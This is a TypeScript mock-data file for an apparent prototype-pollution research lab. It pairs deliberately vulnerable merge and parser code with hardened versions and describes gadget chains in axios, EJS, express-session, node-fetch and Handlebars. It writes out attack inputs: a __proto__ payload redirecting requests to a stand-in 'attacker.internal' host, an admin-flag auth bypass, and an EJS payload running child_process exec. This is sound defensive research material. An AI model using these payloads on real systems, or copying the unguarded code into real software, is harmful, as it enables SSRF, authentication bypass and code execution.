import type {
  PollutionSource, Gadget, Chain, ResearchRun, Scenario, LabState,
  BleedMetrics, Evidence, ObjectState, RuntimeEvent, ChainNode, ChainEdge,
} from '@bleed/shared'

// ─── Evidence ────────────────────────────────────────────────────────────────

export const mockEvidence: Evidence[] = [
  {
    id: 'EVD-001',
    sourceFile: 'lib/utils/merge.js',
    sourceLine: 47,
    property: 'baseURL',
    origin: 'Object.prototype',
    runtimeEvent: 'PROTOTYPE_POLLUTED',
    gadgetId: 'GAD-001',
    impact: 'SYNTHETIC_SSRF',
    timestamp: Date.now() - 3600000,
    fixtureVersion: '1.0.0',
    description: 'Recursive merge assigned __proto__.baseURL from attacker-controlled JSON input',
  },
  {
    id: 'EVD-002',
    sourceFile: 'node_modules/axios/lib/core/mergeConfig.js',
    sourceLine: 23,
    property: 'baseURL',
    origin: 'Object.prototype',
    runtimeEvent: 'GADGET_TRIGGERED',
    gadgetId: 'GAD-001',
    timestamp: Date.now() - 3500000,
    fixtureVersion: '1.0.0',
    description: 'axios mergeConfig read baseURL from inherited Object.prototype, overriding null default',
  },
  {
    id: 'EVD-003',
    sourceFile: 'lib/request/client.js',
    sourceLine: 112,
    property: 'baseURL',
    origin: 'Object.prototype',
    runtimeEvent: 'IMPACT_EXECUTED',
    gadgetId: 'GAD-001',
    impact: 'SYNTHETIC_SSRF',
    timestamp: Date.now() - 3400000,
    fixtureVersion: '1.0.0',
    description: 'HTTP request issued to attacker-controlled baseURL — CONTROLLED LAB IMPACT',
  },
  {
    id: 'EVD-004',
    sourceFile: 'lib/auth/session.js',
    sourceLine: 88,
    property: 'admin',
    origin: 'Object.prototype',
    runtimeEvent: 'GADGET_TRIGGERED',
    gadgetId: 'GAD-003',
    timestamp: Date.now() - 2000000,
    fixtureVersion: '1.0.0',
    description: 'Session check read admin flag from Object.prototype, bypassing auth',
  },
]

// ─── Sources ─────────────────────────────────────────────────────────────────

export const mockSources: PollutionSource[] = [
  {
    id: 'SRC-001',
    name: 'Recursive Config Merge',
    description: 'Deep recursive merge function that assigns properties without prototype checks, allowing __proto__ key injection from user-controlled JSON.',
    file: 'lib/utils/merge.js',
    functionName: 'deepMerge',
    property: 'baseURL',
    fixtureId: 'FIX-001',
    hardeningVariantId: 'FIX-001-HARD',
    evidence: [mockEvidence[0]!],
    status: 'CONFIRMED',
    category: 'RECURSIVE_MERGE',
    vulnerableCode: `function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {}
      deepMerge(target[key], source[key])
    } else {
      // BUG: no prototype check — __proto__ assignment reaches Object.prototype
      target[key] = source[key]
    }
  }
  return target
}`,
    hardenedCode: `function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    // Guard against prototype pollution
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue
    }
    if (Object.prototype.hasOwnProperty.call(source, key)) {
      if (typeof source[key] === 'object' && source[key] !== null) {
        if (!Object.prototype.hasOwnProperty.call(target, key)) {
          target[key] = {}
        }
        deepMerge(target[key] as Record<string, unknown>, source[key] as Record<string, unknown>)
      } else {
        target[key] = source[key]
      }
    }
  }
  return target
}`,
  },
  {
    id: 'SRC-002',
    name: 'Query String Normalizer',
    description: 'URL query string parser that normalizes parameters into an object, vulnerable to bracket notation __proto__ injection.',
    file: 'lib/http/query.js',
    functionName: 'parseQuery',
    property: 'outputFunctionName',
    fixtureId: 'FIX-002',
    evidence: [mockEvidence[1]!],
    status: 'CONFIRMED',
    category: 'QUERY_NORMALIZE',
    vulnerableCode: `function parseQuery(qs) {
  const result = {}
  qs.split('&').forEach(pair => {
    const [k, v] = pair.split('=')
    // BUG: bracket notation allows __proto__[key]=value
    setNestedValue(result, decodeURIComponent(k), decodeURIComponent(v))
  })
  return result
}`,
    hardenedCode: `function parseQuery(qs) {
  const result = Object.create(null) // No prototype
  qs.split('&').forEach(pair => {
    const [k, v] = pair.split('=')
    const key = decodeURIComponent(k ?? '')
    if (key === '__proto__' || key.startsWith('__proto__[')) return
    result[key] = decodeURIComponent(v ?? '')
  })
  return result
}`,
  },
  {
    id: 'SRC-003',
    name: 'Config File Parser',
    description: 'JSON5 config file parser that merges loaded config into app options without sanitization.',
    file: 'lib/config/loader.js',
    functionName: 'loadConfig',
    property: 'env',
    fixtureId: 'FIX-003',
    evidence: [],
    status: 'CONFIRMED',
    category: 'DEEP_PARSER',
    vulnerableCode: `async function loadConfig(path) {
  const raw = await fs.readFile(path, 'utf8')
  const parsed = JSON5.parse(raw)
  // BUG: Object.assign with parsed JSON allows prototype pollution
  return Object.assign(defaults, parsed)
}`,
    hardenedCode: `async function loadConfig(path) {
  const raw = await fs.readFile(path, 'utf8')
  const parsed = JSON5.parse(raw)
  // Validate before merging
  const safe = sanitizeConfig(parsed)
  return Object.assign(Object.create(null), defaults, safe)
}`,
  },
  {
    id: 'SRC-004',
    name: 'Request Body Merge',
    description: 'Express middleware that merges parsed request body into request options object.',
    file: 'lib/middleware/body.js',
    functionName: 'mergeBody',
    property: 'shell',
    fixtureId: 'FIX-004',
    evidence: [],
    status: 'THEORETICAL',
    category: 'PROPERTY_ASSIGN',
    vulnerableCode: `app.use((req, res, next) => {
  // BUG: spreading req.body directly into options
  req.options = { ...defaultOptions, ...req.body }
  next()
})`,
    hardenedCode: `app.use((req, res, next) => {
  const allowedKeys = ['timeout', 'format', 'version']
  const safe = Object.fromEntries(
    Object.entries(req.body ?? {}).filter(([k]) => allowedKeys.includes(k))
  )
  req.options = { ...defaultOptions, ...safe }
  next()
})`,
  },
  {
    id: 'SRC-005',
    name: 'Lodash-style Merge Util',
    description: 'Internal utility replicating lodash merge without the prototype guard patches.',
    file: 'lib/utils/lodash-like.js',
    functionName: 'merge',
    property: 'baseURL',
    fixtureId: 'FIX-005',
    evidence: [],
    status: 'CONFIRMED',
    category: 'UNSAFE_MERGE',
    vulnerableCode: `function merge(object, ...sources) {
  sources.forEach(source => {
    Object.keys(source).forEach(key => {
      // BUG: no Object.prototype.hasOwnProperty check
      if (isObject(source[key])) {
        if (!isObject(object[key])) object[key] = {}
        merge(object[key], source[key])
      } else {
        object[key] = source[key]
      }
    })
  })
  return object
}`,
    hardenedCode: `function merge(object, ...sources) {
  sources.forEach(source => {
    Object.keys(source).forEach(key => {
      if (['__proto__', 'constructor', 'prototype'].includes(key)) return
      if (!Object.prototype.hasOwnProperty.call(source, key)) return
      if (isObject(source[key])) {
        if (!isObject(object[key])) object[key] = {}
        merge(object[key] as object, source[key] as object)
      } else {
        (object as Record<string, unknown>)[key] = source[key]
      }
    })
  })
  return object
}`,
  },
  {
    id: 'SRC-006',
    name: 'GraphQL Variable Flatten',
    description: 'GraphQL variable resolver that flattens nested input types into a flat object.',
    file: 'lib/graphql/variables.js',
    functionName: 'flattenVariables',
    property: 'toString',
    fixtureId: 'FIX-006',
    evidence: [],
    status: 'INCONCLUSIVE',
    category: 'CONFIG_MERGE',
    vulnerableCode: `function flattenVariables(vars, prefix = '') {
  const result = {}
  for (const [k, v] of Object.entries(vars)) {
    const path = prefix ? \`\${prefix}.\${k}\` : k
    if (typeof v === 'object' && v !== null) {
      Object.assign(result, flattenVariables(v, path))
    } else {
      result[path] = v
    }
  }
  return result
}`,
    hardenedCode: `function flattenVariables(vars, prefix = '', depth = 0) {
  if (depth > 10) return {}
  const result = Object.create(null)
  for (const [k, v] of Object.entries(vars)) {
    if (['__proto__', 'constructor', 'prototype'].includes(k)) continue
    const path = prefix ? \`\${prefix}.\${k}\` : k
    if (typeof v === 'object' && v !== null) {
      Object.assign(result, flattenVariables(v as Record<string, unknown>, path, depth + 1))
    } else {
      result[path] = v
    }
  }
  return result
}`,
  },
]

// ─── Gadgets ─────────────────────────────────────────────────────────────────

export const mockGadgets: Gadget[] = [
  {
    id: 'GAD-001',
    library: 'axios',
    versionRange: '<1.6.0',
    property: 'baseURL',
    trigger: 'axios.request() / mergeConfig()',
    category: 'HTTP',
    impactClass: 'SYNTHETIC_SSRF',
    description: 'axios reads baseURL from config which inherits from Object.prototype when not explicitly set, allowing an attacker to redirect all HTTP requests to an arbitrary origin.',
    evidence: [mockEvidence[1]!, mockEvidence[2]!],
    mitigation: {
      strategy: 'Explicit null config + version pin',
      description: 'Pass Object.create(null) as config base, or upgrade to axios ≥1.6.0 which uses hasOwnProperty guards.',
      codeExample: 'const instance = axios.create(Object.assign(Object.create(null), { timeout: 5000 }))',
      verified: true,
    },
    status: 'REPRODUCED',
    labTarget: 'http-sim',
  },
  {
    id: 'GAD-002',
    library: 'ejs',
    versionRange: '<3.1.7',
    property: 'outputFunctionName',
    trigger: 'ejs.render() template compilation',
    category: 'EXECUTION_SIM',
    impactClass: 'SYNTHETIC_EXECUTION_MARKER',
    description: 'EJS template engine reads outputFunctionName from options, which can be inherited from Object.prototype, injecting arbitrary code into compiled template functions.',
    evidence: [],
    mitigation: {
      strategy: 'Upgrade EJS + sanitize options',
      description: 'Upgrade to ejs ≥3.1.7 and use Object.create(null) for template options.',
      verified: true,
    },
    status: 'REACHABLE',
    labTarget: 'exec-sim',
  },
  {
    id: 'GAD-003',
    library: 'express-session',
    versionRange: '<1.17.4',
    property: 'admin',
    trigger: 'req.session property access',
    category: 'AUTH',
    impactClass: 'SYNTHETIC_AUTH_BYPASS',
    description: 'Session middleware reads user role flags directly from session object, which can inherit admin=true from a polluted Object.prototype.',
    evidence: [mockEvidence[3]!],
    mitigation: {
      strategy: 'Explicit session schema validation',
      description: 'Use hasOwnProperty checks for all session property reads, or validate against a schema.',
      verified: false,
    },
    status: 'REPRODUCED',
    labTarget: 'auth-sim',
  },
  {
    id: 'GAD-004',
    library: 'node-fetch',
    versionRange: '<3.0.0',
    property: 'agent',
    trigger: 'fetch() request init',
    category: 'HTTP',
    impactClass: 'SYNTHETIC_HTTP_MANIPULATION',
    description: 'node-fetch reads agent from request init options, inheritable from prototype, allowing injection of a custom proxy agent.',
    evidence: [],
    mitigation: {
      strategy: 'Upgrade to node-fetch v3+',
      description: 'v3+ uses explicit null checks for agent property.',
      verified: false,
    },
    status: 'POTENTIAL',
    labTarget: 'http-sim',
  },
  {
    id: 'GAD-005',
    library: 'vm2',
    versionRange: '<3.9.19',
    property: 'shell',
    trigger: 'VM2 sandbox creation options',
    category: 'EXECUTION_SIM',
    impactClass: 'SYNTHETIC_EXECUTION_MARKER',
    description: 'VM2 sandbox reads shell from options object, enabling simulated shell execution if inherited from prototype.',
    evidence: [],
    mitigation: {
      strategy: 'Upgrade vm2 or migrate to vm.Module',
      description: 'vm2 is unmaintained; migrate to Node.js built-in VM with explicit allowlists.',
      verified: false,
    },
    status: 'POTENTIAL',
    labTarget: 'exec-sim',
  },
  {
    id: 'GAD-006',
    library: 'handlebars',
    versionRange: '<4.7.7',
    property: 'toString',
    trigger: 'Handlebars.compile() helper lookup',
    category: 'CALLBACK',
    impactClass: 'SYNTHETIC_EXECUTION_MARKER',
    description: 'Handlebars helper lookup traverses prototype chain, allowing a polluted toString/constructor to execute during template rendering.',
    evidence: [],
    mitigation: {
      strategy: 'Upgrade Handlebars + allowlist helpers',
      description: 'Use an explicit helper registry with Object.create(null) as the base.',
      verified: true,
    },
    status: 'REACHABLE',
    labTarget: 'exec-sim',
  },
]

// ─── Chain Nodes & Edges for Primary Demo ────────────────────────────────────

const primaryNodes: ChainNode[] = [
  { id: 'n-input', type: 'INPUT', label: 'Attacker JSON Input', property: 'baseURL' },
  { id: 'n-parser', type: 'PARSER', label: 'JSON.parse()', property: 'baseURL' },
  { id: 'n-merge', type: 'MERGE', label: 'deepMerge(target, source)', property: 'baseURL' },
  { id: 'n-proto', type: 'PROTOTYPE', label: 'Object.prototype', property: 'baseURL' },
  { id: 'n-obj1', type: 'OBJECT', label: 'config {}', property: 'baseURL' },
  { id: 'n-obj2', type: 'OBJECT', label: 'requestOptions {}', property: 'baseURL' },
  { id: 'n-lib', type: 'LIBRARY', label: 'axios mergeConfig()', property: 'baseURL' },
  { id: 'n-gadget', type: 'GADGET', label: 'baseURL read', property: 'baseURL' },
  { id: 'n-target', type: 'TARGET', label: 'http-sim:4001', property: 'baseURL' },
  { id: 'n-impact', type: 'IMPACT', label: 'SYNTHETIC_SSRF', property: 'baseURL' },
]

const primaryEdges: ChainEdge[] = [
  { from: 'n-input', to: 'n-parser', type: 'WRITES', property: 'baseURL' },
  { from: 'n-parser', to: 'n-merge', type: 'WRITES', property: 'baseURL' },
  { from: 'n-merge', to: 'n-proto', type: 'WRITES', property: 'baseURL' },
  { from: 'n-proto', to: 'n-obj1', type: 'INHERITS', property: 'baseURL' },
  { from: 'n-proto', to: 'n-obj2', type: 'INHERITS', property: 'baseURL' },
  { from: 'n-obj2', to: 'n-lib', type: 'READS', property: 'baseURL' },
  { from: 'n-lib', to: 'n-gadget', type: 'INVOKES', property: 'baseURL' },
  { from: 'n-gadget', to: 'n-target', type: 'REACHES', property: 'baseURL' },
  { from: 'n-target', to: 'n-impact', type: 'REACHES', property: 'baseURL' },
]

// ─── Chains ───────────────────────────────────────────────────────────────────

export const mockChains: Chain[] = [
  {
    id: 'CHN-001',
    name: 'deepMerge → axios baseURL → SSRF',
    sourceId: 'SRC-001',
    property: 'baseURL',
    gadgetIds: ['GAD-001'],
    impact: 'SYNTHETIC_SSRF',
    status: 'REPRODUCED',
    confidence: 'CONFIRMED',
    evidence: mockEvidence,
    mitigation: {
      strategy: 'Recursive merge key guard + axios null config',
      description: 'Guard __proto__, constructor, prototype keys in deepMerge. Pass Object.create(null) to axios.',
      verified: true,
    },
    nodes: primaryNodes,
    edges: primaryEdges,
    scenarioId: 'SCN-001',
    createdAt: Date.now() - 7200000,
  },
  {
    id: 'CHN-002',
    name: 'parseQuery → EJS outputFunctionName → RCE-sim',
    sourceId: 'SRC-002',
    property: 'outputFunctionName',
    gadgetIds: ['GAD-002'],
    impact: 'SYNTHETIC_EXECUTION_MARKER',
    status: 'REACHABLE',
    confidence: 'HIGH',
    evidence: [],
    nodes: [
      { id: 'n2-input', type: 'INPUT', label: 'Query String ?a[__proto__][outputFunctionName]=...' },
      { id: 'n2-parse', type: 'PARSER', label: 'parseQuery()' },
      { id: 'n2-proto', type: 'PROTOTYPE', label: 'Object.prototype', property: 'outputFunctionName' },
      { id: 'n2-lib', type: 'LIBRARY', label: 'EJS compile()' },
      { id: 'n2-impact', type: 'IMPACT', label: 'SYNTHETIC_EXECUTION_MARKER' },
    ],
    edges: [
      { from: 'n2-input', to: 'n2-parse', type: 'WRITES' },
      { from: 'n2-parse', to: 'n2-proto', type: 'WRITES', property: 'outputFunctionName' },
      { from: 'n2-proto', to: 'n2-lib', type: 'INHERITS', property: 'outputFunctionName' },
      { from: 'n2-lib', to: 'n2-impact', type: 'REACHES' },
    ],
    createdAt: Date.now() - 5000000,
  },
  {
    id: 'CHN-003',
    name: 'deepMerge → express-session admin → Auth Bypass',
    sourceId: 'SRC-001',
    property: 'admin',
    gadgetIds: ['GAD-003'],
    impact: 'SYNTHETIC_AUTH_BYPASS',
    status: 'REPRODUCED',
    confidence: 'CONFIRMED',
    evidence: [mockEvidence[3]!],
    nodes: [
      { id: 'n3-input', type: 'INPUT', label: 'Request Body {"__proto__":{"admin":true}}' },
      { id: 'n3-merge', type: 'MERGE', label: 'deepMerge()' },
      { id: 'n3-proto', type: 'PROTOTYPE', label: 'Object.prototype', property: 'admin' },
      { id: 'n3-session', type: 'OBJECT', label: 'req.session', property: 'admin' },
      { id: 'n3-gadget', type: 'GADGET', label: 'session.admin check' },
      { id: 'n3-impact', type: 'IMPACT', label: 'SYNTHETIC_AUTH_BYPASS' },
    ],
    edges: [
      { from: 'n3-input', to: 'n3-merge', type: 'WRITES' },
      { from: 'n3-merge', to: 'n3-proto', type: 'WRITES', property: 'admin' },
      { from: 'n3-proto', to: 'n3-session', type: 'INHERITS', property: 'admin' },
      { from: 'n3-session', to: 'n3-gadget', type: 'READS', property: 'admin' },
      { from: 'n3-gadget', to: 'n3-impact', type: 'REACHES' },
    ],
    createdAt: Date.now() - 3000000,
  },
  {
    id: 'CHN-004',
    name: 'lodashMerge → node-fetch agent → HTTP Manipulation',
    sourceId: 'SRC-005',
    property: 'agent',
    gadgetIds: ['GAD-004'],
    impact: 'SYNTHETIC_HTTP_MANIPULATION',
    status: 'POTENTIAL',
    confidence: 'MEDIUM',
    evidence: [],
    nodes: [
      { id: 'n4-input', type: 'INPUT', label: 'Config Object with __proto__' },
      { id: 'n4-merge', type: 'MERGE', label: 'merge()' },
      { id: 'n4-proto', type: 'PROTOTYPE', label: 'Object.prototype', property: 'agent' },
      { id: 'n4-lib', type: 'LIBRARY', label: 'node-fetch fetch()' },
      { id: 'n4-impact', type: 'IMPACT', label: 'SYNTHETIC_HTTP_MANIPULATION' },
    ],
    edges: [
      { from: 'n4-input', to: 'n4-merge', type: 'WRITES' },
      { from: 'n4-merge', to: 'n4-proto', type: 'WRITES', property: 'agent' },
      { from: 'n4-proto', to: 'n4-lib', type: 'INHERITS', property: 'agent' },
      { from: 'n4-lib', to: 'n4-impact', type: 'REACHES' },
    ],
    createdAt: Date.now() - 1500000,
  },
  {
    id: 'CHN-005',
    name: 'configLoader → Handlebars toString → Exec-sim',
    sourceId: 'SRC-003',
    property: 'toString',
    gadgetIds: ['GAD-006'],
    impact: 'SYNTHETIC_EXECUTION_MARKER',
    status: 'REACHABLE',
    confidence: 'HIGH',
    evidence: [],
    nodes: [
      { id: 'n5-input', type: 'INPUT', label: 'Config File with __proto__' },
      { id: 'n5-parse', type: 'PARSER', label: 'JSON5.parse()' },
      { id: 'n5-proto', type: 'PROTOTYPE', label: 'Object.prototype', property: 'toString' },
      { id: 'n5-lib', type: 'LIBRARY', label: 'Handlebars.compile()' },
      { id: 'n5-impact', type: 'IMPACT', label: 'SYNTHETIC_EXECUTION_MARKER' },
    ],
    edges: [
      { from: 'n5-input', to: 'n5-parse', type: 'WRITES' },
      { from: 'n5-parse', to: 'n5-proto', type: 'WRITES', property: 'toString' },
      { from: 'n5-proto', to: 'n5-lib', type: 'INHERITS', property: 'toString' },
      { from: 'n5-lib', to: 'n5-impact', type: 'REACHES' },
    ],
    createdAt: Date.now() - 900000,
  },
]

// ─── Object States ────────────────────────────────────────────────────────────

export const mockObjectStates: ObjectState[] = [
  {
    id: 'OBJ-BEFORE',
    timestamp: Date.now() - 3700000,
    label: 'config (before pollution)',
    ownProperties: [
      { key: 'timeout', value: 5000, type: 'number', own: true },
      { key: 'headers', value: { 'Content-Type': 'application/json' }, type: 'object', own: true },
    ],
    inheritedProperties: [
      { key: 'toString', value: '[Function: toString]', type: 'function', own: false, origin: 'Object.prototype' },
      { key: 'hasOwnProperty', value: '[Function: hasOwnProperty]', type: 'function', own: false, origin: 'Object.prototype' },
    ],
    prototypeChain: ['config', 'Object.prototype', 'null'],
    polluted: false,
  },
  {
    id: 'OBJ-AFTER',
    timestamp: Date.now() - 3500000,
    label: 'config (after pollution)',
    ownProperties: [
      { key: 'timeout', value: 5000, type: 'number', own: true },
      { key: 'headers', value: { 'Content-Type': 'application/json' }, type: 'object', own: true },
    ],
    inheritedProperties: [
      { key: 'baseURL', value: 'http://attacker.internal/ssrf', type: 'string', own: false, origin: 'Object.prototype', introducedBy: 'SRC-001', propagationCount: 14 },
      { key: 'toString', value: '[Function: toString]', type: 'function', own: false, origin: 'Object.prototype' },
      { key: 'hasOwnProperty', value: '[Function: hasOwnProperty]', type: 'function', own: false, origin: 'Object.prototype' },
    ],
    prototypeChain: ['config', 'Object.prototype', 'null'],
    polluted: true,
  },
]

// ─── Runtime Events ───────────────────────────────────────────────────────────

export const mockEvents: RuntimeEvent[] = [
  {
    id: 'EVT-001',
    type: 'INPUT_RECEIVED',
    timestamp: Date.now() - 3700000,
    relativeMs: 0,
    description: 'Received attacker-controlled JSON body',
    property: 'baseURL',
    value: { __proto__: { baseURL: 'http://attacker.internal/ssrf' } },
  },
  {
    id: 'EVT-002',
    type: 'MERGE_EXECUTED',
    timestamp: Date.now() - 3690000,
    relativeMs: 10,
    description: 'deepMerge() called on request body → target config object',
    sourceId: 'SRC-001',
  },
  {
    id: 'EVT-003',
    type: 'PROTOTYPE_POLLUTED',
    timestamp: Date.now() - 3680000,
    relativeMs: 21,
    description: 'Object.prototype.baseURL set to "http://attacker.internal/ssrf"',
    property: 'baseURL',
    value: 'http://attacker.internal/ssrf',
    objectStateId: 'OBJ-AFTER',
    evidence: [mockEvidence[0]!],
  },
  {
    id: 'EVT-004',
    type: 'PROPERTY_INHERITED',
    timestamp: Date.now() - 3670000,
    relativeMs: 31,
    description: '14 objects now inherit baseURL from Object.prototype',
    property: 'baseURL',
  },
  {
    id: 'EVT-005',
    type: 'GADGET_TRIGGERED',
    timestamp: Date.now() - 3650000,
    relativeMs: 51,
    description: 'axios mergeConfig() read baseURL from config — inherited from Object.prototype',
    gadgetId: 'GAD-001',
    evidence: [mockEvidence[1]!],
  },
  {
    id: 'EVT-006',
    type: 'IMPACT_EXECUTED',
    timestamp: Date.now() - 3600000,
    relativeMs: 101,
    description: 'HTTP GET issued to http://attacker.internal/ssrf — CONTROLLED LAB IMPACT',
    evidence: [mockEvidence[2]!],
  },
]

// ─── Research Runs ────────────────────────────────────────────────────────────

export const mockRuns: ResearchRun[] = [
  {
    id: 'RUN-001',
    scenarioId: 'SCN-001',
    fixtureId: 'FIX-001',
    fixtureVersion: '1.0.0',
    packageVersions: { axios: '0.27.2', 'express': '4.18.2' },
    chain: mockChains[0]!,
    input: { __proto__: { baseURL: 'http://attacker.internal/ssrf' } },
    objectStates: mockObjectStates,
    events: mockEvents,
    propagation: {
      property: 'baseURL',
      origin: 'Object.prototype',
      introducedBy: 'SRC-001',
      affectedObjects: [
        { id: 'obj-config', label: 'config', type: 'object' },
        { id: 'obj-req', label: 'requestOptions', type: 'object' },
        { id: 'obj-defaults', label: 'axios defaults', type: 'object' },
      ],
      evidence: mockEvidence,
      timestamp: Date.now() - 3680000,
    },
    result: 'REPRODUCED',
    mitigationState: 'VULNERABLE',
    evidence: mockEvidence,
    duration: 101,
    timestamp: Date.now() - 3600000,
    notes: [],
  },
  {
    id: 'RUN-002',
    scenarioId: 'SCN-001',
    fixtureId: 'FIX-001-HARD',
    fixtureVersion: '1.0.0',
    packageVersions: { axios: '1.6.2', 'express': '4.18.2' },
    chain: { ...mockChains[0]!, status: 'BLOCKED' },
    input: { __proto__: { baseURL: 'http://attacker.internal/ssrf' } },
    objectStates: [mockObjectStates[0]!],
    events: [
      mockEvents[0]!,
      mockEvents[1]!,
      {
        id: 'EVT-BLOCKED',
        type: 'HARDENED_BLOCKED',
        timestamp: Date.now() - 1800000,
        relativeMs: 12,
        description: 'deepMerge key guard blocked __proto__ assignment — no prototype pollution occurred',
        property: 'baseURL',
      },
    ],
    result: 'BLOCKED',
    mitigationState: 'HARDENED',
    evidence: [],
    duration: 12,
    timestamp: Date.now() - 1800000,
    notes: [],
  },
  {
    id: 'RUN-003',
    scenarioId: 'SCN-003',
    fixtureId: 'FIX-002',
    fixtureVersion: '1.0.0',
    packageVersions: { 'express-session': '1.17.3' },
    chain: mockChains[2]!,
    input: { __proto__: { admin: true } },
    objectStates: mockObjectStates,
    events: mockEvents.slice(0, 4),
    result: 'REPRODUCED',
    mitigationState: 'VULNERABLE',
    evidence: [mockEvidence[3]!],
    duration: 44,
    timestamp: Date.now() - 86400000,
    notes: [],
  },
  {
    id: 'RUN-004',
    scenarioId: 'SCN-002',
    fixtureId: 'FIX-003',
    fixtureVersion: '1.0.0',
    packageVersions: { ejs: '3.1.6' },
    chain: mockChains[1]!,
    input: { __proto__: { outputFunctionName: 'a=1;process.mainModule.require("child_process").exec("id")' } },
    objectStates: mockObjectStates,
    events: mockEvents.slice(0, 5),
    result: 'REACHABLE',
    mitigationState: 'VULNERABLE',
    evidence: [],
    duration: 78,
    timestamp: Date.now() - 172800000,
    notes: [],
  },
  {
    id: 'RUN-005',
    scenarioId: 'SCN-004',
    fixtureId: 'FIX-004',
    fixtureVersion: '1.0.0',
    packageVersions: { 'node-fetch': '2.6.7' },
    chain: mockChains[3]!,
    input: { __proto__: { agent: '{ HOST: "attacker.internal" }' } },
    objectStates: mockObjectStates,
    events: mockEvents.slice(0, 3),
    result: 'POTENTIAL',
    mitigationState: 'VULNERABLE',
    evidence: [],
    duration: 22,
    timestamp: Date.now() - 259200000,
    notes: [],
  },
]

// ─── Scenarios ────────────────────────────────────────────────────────────────

export const mockScenarios: Scenario[] = [
  {
    id: 'SCN-001',
    name: 'deepMerge SSRF via axios baseURL',
    description: 'Demonstrates server-side prototype pollution through a recursive merge function, propagating baseURL to Object.prototype and triggering an SSRF via axios HTTP client.',
    difficulty: 'BEGINNER',
    fixtureId: 'FIX-001',
    sourceId: 'SRC-001',
    property: 'baseURL',
    gadgetId: 'GAD-001',
    impact: 'SYNTHETIC_SSRF',
    labTarget: 'http-sim',
    expected: {
      propagation: true,
      gadgetReachable: true,
      impactReproduced: true,
      hardenedBlocked: true,
    },
    tags: ['ssrf', 'axios', 'http', 'beginner'],
  },
  {
    id: 'SCN-002',
    name: 'Query Parser → EJS RCE-sim',
    description: 'Injects outputFunctionName via URL query bracket notation, reaching EJS template compilation.',
    difficulty: 'ADVANCED',
    fixtureId: 'FIX-002',
    sourceId: 'SRC-002',
    property: 'outputFunctionName',
    gadgetId: 'GAD-002',
    impact: 'SYNTHETIC_EXECUTION_MARKER',
    labTarget: 'exec-sim',
    expected: {
      propagation: true,
      gadgetReachable: true,
      impactReproduced: false,
      hardenedBlocked: true,
    },
    tags: ['ejs', 'rce', 'template', 'advanced'],
  },
  {
    id: 'SCN-003',
    name: 'Session Admin Bypass',
    description: 'Pollutes Object.prototype.admin=true, bypassing role checks in express-session middleware.',
    difficulty: 'INTERMEDIATE',
    fixtureId: 'FIX-003',
    sourceId: 'SRC-001',
    property: 'admin',
    gadgetId: 'GAD-003',
    impact: 'SYNTHETIC_AUTH_BYPASS',
    labTarget: 'auth-sim',
    expected: {
      propagation: true,
      gadgetReachable: true,
      impactReproduced: true,
      hardenedBlocked: false,
    },
    tags: ['auth', 'session', 'bypass', 'intermediate'],
  },
  {
    id: 'SCN-004',
    name: 'Config Merge → node-fetch Agent Injection',
    description: 'Lodash-style merge injects agent into Object.prototype, redirecting all node-fetch requests through a proxy.',
    difficulty: 'INTERMEDIATE',
    fixtureId: 'FIX-004',
    sourceId: 'SRC-005',
    property: 'agent',
    gadgetId: 'GAD-004',
    impact: 'SYNTHETIC_HTTP_MANIPULATION',
    labTarget: 'http-sim',
    expected: {
      propagation: true,
      gadgetReachable: true,
      impactReproduced: false,
      hardenedBlocked: true,
    },
    tags: ['http', 'proxy', 'node-fetch', 'intermediate'],
  },
  {
    id: 'SCN-005',
    name: 'Handlebars Helper Prototype Traversal',
    description: 'Config file pollution injects toString into Object.prototype, hijacking Handlebars helper lookup during template compilation.',
    difficulty: 'ADVANCED',
    fixtureId: 'FIX-005',
    sourceId: 'SRC-003',
    property: 'toString',
    gadgetId: 'GAD-006',
    impact: 'SYNTHETIC_EXECUTION_MARKER',
    labTarget: 'exec-sim',
    expected: {
      propagation: true,
      gadgetReachable: true,
      impactReproduced: false,
      hardenedBlocked: true,
    },
    tags: ['handlebars', 'template', 'exec', 'advanced'],
  },
]

// ─── Lab State ────────────────────────────────────────────────────────────────

export const mockLabState: LabState = {
  status: 'READY',
  services: [
    {
      id: 'svc-api',
      name: 'BLEED API',
      description: 'Core research API server',
      port: 4001,
      status: 'READY',
      healthUrl: 'http://localhost:4001/health',
    },
    {
      id: 'svc-http-sim',
      name: 'http-sim',
      description: 'HTTP request capture simulator',
      port: 4010,
      status: 'READY',
      healthUrl: 'http://localhost:4010/health',
    },
    {
      id: 'svc-exec-sim',
      name: 'exec-sim',
      description: 'Execution marker simulator',
      port: 4011,
      status: 'READY',
    },
    {
      id: 'svc-auth-sim',
      name: 'auth-sim',
      description: 'Auth bypass simulator',
      port: 4012,
      status: 'READY',
    },
  ],
  startedAt: Date.now() - 3600000,
}

// ─── Metrics ─────────────────────────────────────────────────────────────────

export const mockMetrics: BleedMetrics = {
  sources: mockSources.length,
  gadgets: mockGadgets.length,
  reachableChains: mockChains.filter(c => ['REACHABLE', 'REPRODUCED'].includes(c.status)).length,
  reproducedChains: mockChains.filter(c => c.status === 'REPRODUCED').length,
  hardenedBlocked: mockRuns.filter(r => r.result === 'BLOCKED').length,
  totalRuns: mockRuns.length,
  lastRunAt: Math.max(...mockRuns.map(r => r.timestamp)),
}
